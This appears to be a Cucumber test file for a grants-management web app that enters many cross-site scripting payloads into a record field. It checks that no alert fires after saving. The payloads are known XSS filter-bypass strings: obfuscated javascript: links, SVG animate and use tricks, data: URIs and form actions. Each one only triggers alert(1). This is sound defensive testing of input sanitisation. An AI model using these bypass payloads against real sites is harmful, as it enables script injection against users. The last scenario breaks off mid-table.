    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                 | Field                  |
      | <a href="JaVaScript:alert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302259 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                   | Field                  |
      | <a href=" 	javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302260 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                  | Field                  |
      | <a href="javas	cript:alert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302263 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                 | Field                  |
      | <a href="javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302264 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                  |
      | <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302269 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                  | Field                  |
      | <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302270 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                     | Field                  |
      | <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302274 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                 | Field                  |
      | <svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302277 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                 | Field                  |
      | <script src="data:text/javascript,alert(1)"></script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302282 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                | Field                  |
      | <svg><script href="data:text/javascript,alert(1)" /> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302283 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                             | Field                  |
      | <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302286 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                  |
      | <script>import('data:text/javascript,alert(1)')</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302290 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                           | Field                  |
      | <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302305 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                    | Field                  |
      | <math><x href="javascript:alert(1)">blah | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302309 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                            | Field                  |
      | <form><button formaction=javascript:alert(1)>XSS | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302311 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                              | Field                  |
      | <form><input type=submit formaction=javascript:alert(1) value=XSS> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302312 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                          | Field                  |
      | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302313 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                      | Field                  |
      | <svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302314 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                      | Field                  |
      | <a href="javascript://%0aalert(1)">XSS</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302315 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                          | Field                  |
      | <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302317 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                 | Field                  |
      | <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
